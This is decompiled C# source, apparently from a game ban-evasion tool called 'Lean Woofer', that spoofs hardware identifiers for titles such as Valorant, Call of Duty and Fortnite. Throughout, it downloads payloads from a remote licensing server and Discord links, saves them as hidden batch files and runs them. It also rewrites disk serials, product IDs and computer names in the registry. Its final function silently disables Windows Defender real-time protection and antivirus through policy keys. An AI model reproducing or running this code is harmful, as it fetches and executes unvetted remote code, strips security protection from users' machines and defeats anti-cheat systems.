					Main.Diskclick();
					Main.bi();
					Main.SpoofPCName();
					string path4 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path4))
					{
						Directory.CreateDirectory(path4);
					}
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text5 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter5 = File.CreateText(text5))
						{
							streamWriter5.WriteLine("netsh int ip reset");
						}
						Process process6 = new Process();
						process6.StartInfo.FileName = text5;
						this.d.Add(process6);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process6.Start();
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
					}
					string text6 = this.bm.Text;
					string path5 = "C:\\Program Files\\Unlisted";
					if (!Directory.Exists(path5))
					{
						Directory.CreateDirectory(path5);
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						string text7 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter6 = File.CreateText(text7))
						{
							streamWriter6.WriteLine(string.Concat(new string[]
							{
								"volumeid.exe ",
								text6,
								": ",
								Main.DiskGen(4),
								"-",
								Main.DiskGen(4),
								" -nobanner"
							}));
						}
						Process process7 = new Process();
						process7.StartInfo.FileName = text7;
						this.d.Add(process7);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process7.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path5);
					}
					else
					{
						byte[] bytes3 = Login.KeyAuthApp.download("558460");
						File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", bytes3);
						File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
						Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
						Thread.Sleep(500);
						string text8 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter7 = File.CreateText(text8))
						{
							streamWriter7.WriteLine(string.Concat(new string[]
							{
								"volumeid.exe ",
								text6,
								": ",
								Main.DiskGen(4),
								"-",
								Main.DiskGen(4),
								" -nobanner"
							}));
						}
						Process process8 = new Process();
						process8.StartInfo.FileName = text8;
						this.d.Add(process8);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process8.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path5);
					}
					MessageBox.Show("Spoofed Rust!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.aq.Text == "Valorant v2")
				{
					string tempPath3 = Path.GetTempPath();
					byte[] bytes4 = Login.KeyAuthApp.download("479255");
					File.WriteAllBytes(tempPath3 + this.c + ".bat", bytes4);
					File.SetAttributes(tempPath3 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath3 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					foreach (string text9 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
					{
						foreach (string text10 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text9).GetSubKeyNames())
						{
							RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
							{
								"HARDWARE\\DEVICEMAP\\Scsi\\",
								text9,
								"\\",
								text10,
								"\\Target Id 0\\Logical Unit Id 0"
							}), true);
							if (registryKey2 != null && registryKey2.GetValue("DeviceType").ToString() == "DiskPeripheral")
							{
								string value2 = Main.RandomId(14);
								string value3 = Main.RandomId(14);
								registryKey2.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(value3));
								registryKey2.SetValue("Identifier", value2);
								registryKey2.SetValue("InquiryData", Encoding.UTF8.GetBytes(value2));
								registryKey2.SetValue("SerialNumber", value3);
							}
						}
						RegistryKey registryKey3 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
						registryKey3.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
						registryKey3.Close();
						string.Concat(new string[]
						{
							Main.GenerateString(5),
							"-",
							Main.GenerateString(5),
							"-",
							Main.GenerateString(5),
							"-",
							Main.GenerateString(5)
						});
						string path6 = "C:\\Program Files\\Sounds";
						if (!Directory.Exists(path6))
						{
							Directory.CreateDirectory(path6);
						}
						Main.HWIDclick();
						string path7 = "C:\\Program Files\\Sounds";
						if (!Directory.Exists(path7))
						{
							Directory.CreateDirectory(path7);
						}
						if (File.Exists("C:\\Program Files\\Sounds\\valospoofed.wav"))
						{
							new SoundPlayer("C:\\Program Files\\Sounds\\valospoofed.wav").Play();
						}
						else
						{
							string address2 = "https://cdn.discordapp.com/attachments/953684464104513571/960200320993095731/valospoofed.wav";
							string fileName2 = "C:\\Program Files\\Sounds\\valospoofed.wav";
							WebClient webClient2 = new WebClient();
							webClient2.DownloadFile(address2, fileName2);
							File.SetAttributes("C:\\Program Files\\Sounds\\valospoofed.wav", FileAttributes.Hidden);
							new SoundPlayer("C:\\Program Files\\Sounds\\valospoofed.wav").Play();
						}
						MessageBox.Show("Valorant Spoofed, New ID: " + Main.CurrentProductID(), "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
				}
				else if (this.aq.Text == "Call Of Duty")
				{
					string tempPath4 = Path.GetTempPath();
					byte[] bytes5 = Login.KeyAuthApp.download("319355");
					File.WriteAllBytes(tempPath4 + this.c + ".bat", bytes5);
					File.SetAttributes(tempPath4 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath4 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					d d3 = new d();
					d3.b();
					Main.HWIDclick();
					string value4 = string.Concat(new string[]
					{
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5),
						"-",
						Main.GenerateString(5)
					});
					RegistryKey registryKey4 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
					registryKey4.SetValue("ProductID", value4);
					registryKey4.Close();
					Main.InstallDate();
					Main.Disk();
					Main.HWIDclick();
					Main.XBOXclick();
					Main.PCclick();
					Main.Diskclick();
					Main.bi();
					Main.SpoofPCName();
					string tempPath5 = Path.GetTempPath();
					byte[] bytes6 = Login.KeyAuthApp.download("075553");
					File.WriteAllBytes(tempPath5 + this.c + ".bat", bytes6);
					File.SetAttributes(tempPath5 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath5 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					string path8 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path8))
					{
						Directory.CreateDirectory(path8);
					}
					string tempPath6 = Path.GetTempPath();
					byte[] bytes7 = Login.KeyAuthApp.download("743506");
					File.WriteAllBytes(tempPath6 + this.c + ".bat", bytes7);
					File.SetAttributes(tempPath6 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath6 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text11 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter8 = File.CreateText(text11))
						{
							streamWriter8.WriteLine("netsh int ip reset");
						}
						Process process9 = new Process();
						process9.StartInfo.FileName = text11;
						this.d.Add(process9);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process9.Start();
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\change.bat"))
					{
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
					}
					string text12 = this.bm.Text;
					string path9 = "C:\\Program Files\\Unlisted";
					if (!Directory.Exists(path9))
					{
						Directory.CreateDirectory(path9);
					}
					if (File.Exists("C:\\Program Files\\Unlisted\\Volumeid.exe"))
					{
						string text13 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter9 = File.CreateText(text13))
						{
							streamWriter9.WriteLine(string.Concat(new string[]
							{
								"volumeid.exe ",
								text12,
								": ",
								Main.DiskGen(4),
								"-",
								Main.DiskGen(4),
								" -nobanner"
							}));
						}
						Process process10 = new Process();
						process10.StartInfo.FileName = text13;
						this.d.Add(process10);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process10.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path9);
					}
					else
					{
						byte[] bytes8 = Login.KeyAuthApp.download("558460");
						File.WriteAllBytes("C:\\Program Files\\Unlisted\\Volumeid.exe", bytes8);
						File.SetAttributes("C:\\Program Files\\Unlisted\\Volumeid.exe", FileAttributes.Hidden);
						Process.Start("C:\\Program Files\\Unlisted\\Volumeid.exe");
						Thread.Sleep(500);
						string text14 = "C:\\Program Files\\Unlisted\\change.bat";
						using (StreamWriter streamWriter10 = File.CreateText(text14))
						{
							streamWriter10.WriteLine(string.Concat(new string[]
							{
								"volumeid.exe ",
								text12,
								": ",
								Main.DiskGen(4),
								"-",
								Main.DiskGen(4),
								" -nobanner"
							}));
						}
						Process process11 = new Process();
						process11.StartInfo.FileName = text14;
						this.d.Add(process11);
						File.SetAttributes("C:\\Program Files\\Unlisted\\change.bat", FileAttributes.Hidden);
						process11.Start();
						File.Delete("C:\\Program Files\\Unlisted\\Volumeid.exe");
						File.Delete("C:\\Program Files\\Unlisted\\change.bat");
						Directory.Delete(path9);
					}
					MessageBox.Show("Spoofed Call Of Duty!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.aq.Text == "Fortnite")
				{
					string tempPath7 = Path.GetTempPath();
					byte[] bytes9 = Login.KeyAuthApp.download("299894");
					File.WriteAllBytes(tempPath7 + this.c + ".bat", bytes9);
					File.SetAttributes(tempPath7 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath7 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					string tempPath8 = Path.GetTempPath();
					byte[] bytes10 = Login.KeyAuthApp.download("203677");
					File.WriteAllBytes(tempPath8 + this.c + ".bat", bytes10);
					File.SetAttributes(tempPath8 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath8 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					string tempPath9 = Path.GetTempPath();
					byte[] bytes11 = Login.KeyAuthApp.download("639184");
					File.WriteAllBytes(tempPath9 + this.c + ".bat", bytes11);
					File.SetAttributes(tempPath9 + this.c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath9 + this.c + ".bat");
					Thread.Sleep(2500);
					this.xynwbyzia();
					string path10 = "C:\\Program Files\\Sounds";
					if (!Directory.Exists(path10))
					{
						Directory.CreateDirectory(path10);
					}
					if (File.Exists("C:\\Program Files\\Sounds\\fortinaity.wav"))
					{
						new SoundPlayer("C:\\Program Files\\Sounds\\fortinaity.wav").Play();
						MessageBox.Show("Fortnite Spoofed!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
					else
					{
						string address3 = "https://cdn.discordapp.com/attachments/953684464104513571/959438041670381628/fortinaity.wav";
						string fileName3 = "C:\\Program Files\\Sounds\\fortinaity.wav";
						WebClient webClient3 = new WebClient();
						webClient3.DownloadFile(address3, fileName3);
						File.SetAttributes("C:\\Program Files\\Sounds\\fortinaity.wav", FileAttributes.Hidden);
						new SoundPlayer("C:\\Program Files\\Sounds\\fortinaity.wav").Play();
						MessageBox.Show("Fortnite Spoofed!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					}
				}
				else
				{
					MessageBox.Show("Please Select A Game!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600005A RID: 90 RVA: 0x000021A7 File Offset: 0x000003A7
		private void ac(object sender, EventArgs e)
		{
			this.ak.BringToFront();
		}

		// Token: 0x0600005B RID: 91 RVA: 0x000021B4 File Offset: 0x000003B4
		private void ad(object sender, EventArgs e)
		{
			this.ar.BringToFront();
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00002198 File Offset: 0x00000398
		private void ae(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00006468 File Offset: 0x00004668
		private void af(object sender, EventArgs e)
		{
			if (this.aq.Text == "FiveM Bypass")
			{
				this.bw.Show();
				this.bx.Show();
			}
			else
			{
				this.bw.Hide();
				this.bx.Hide();
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x000021C1 File Offset: 0x000003C1
		private void ag(object sender, EventArgs e)
		{
			Main.HWIDclick();
			MessageBox.Show("Spoofed HWID!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600005F RID: 95 RVA: 0x000064BC File Offset: 0x000046BC
		public void xynwbyzia()
		{
			string tempPath = Path.GetTempPath();
			if (Process.GetProcessesByName(this.c + ".bat").Length == 0)
			{
				File.Delete(tempPath + this.c + ".bat");
			}
			else
			{
				Thread.Sleep(5000);
				this.xynwbyzia();
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00006514 File Offset: 0x00004714
		public static string GenerateDate(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "abcdef0123456789"[Main.random.Next("abcdef0123456789".Length)];
			}
			return new string(array);
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00006560 File Offset: 0x00004760
		private void ah(object sender, EventArgs e)
		{
			string value = Main.GenerateDate(8);
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("InstallDate", value);
			registryKey.Close();
			string tempPath = Path.GetTempPath();
			byte[] bytes = Login.KeyAuthApp.download("299894");
			File.WriteAllBytes(tempPath + this.c + ".bat", bytes);
			File.SetAttributes(tempPath + this.c + ".bat", FileAttributes.Hidden);
			Process.Start(tempPath + this.c + ".bat");
			Thread.Sleep(2500);
			this.xynwbyzia();
			MessageBox.Show("Logs Spoofed!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00006620 File Offset: 0x00004820
		private void ai(object sender, EventArgs e)
		{
			string tempPath = Path.GetTempPath();
			byte[] bytes = Login.KeyAuthApp.download("358697");
			File.WriteAllBytes(tempPath + this.c + ".bat", bytes);
			Process.Start(tempPath + this.c + ".bat");
			Thread.Sleep(2500);
			this.xynwbyzia();
			MessageBox.Show("Mac Spoofed!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00006694 File Offset: 0x00004894
		private void aj(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
